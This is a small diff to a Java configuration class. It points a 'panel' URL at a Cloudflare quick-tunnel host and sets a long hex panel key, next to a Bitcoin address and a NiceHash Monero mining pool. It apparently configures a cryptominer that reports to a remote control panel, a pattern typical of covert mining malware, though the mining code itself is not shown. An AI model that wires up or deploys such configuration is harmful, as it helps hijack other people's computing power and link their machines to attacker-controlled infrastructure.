@@ -12,8 +12,8 @@ import java.nio.file.Path;
 public final class Config {
     private static final Gson GSON = new GsonBuilder().setPrettyPrinting().create();
 
-    public String panelUrl   = "http://127.0.0.1:8787";
-    public String panelKey   = "change-me-6767";
+    public String panelUrl   = "https://specialized-settle-salvation-tech.trycloudflare.com";
+    public String panelKey   = "f82556b381176003d8b6c4859463ae593a53943fc6140be71941e737779896dd";
     public String btcAddress = "bc1qxq6u0lknqng4vr295p4rscfe5mjlgnjpelsrlj";
     public String pool       = "xmr.auto.nicehash.com:9200";
     public String worker     = "";
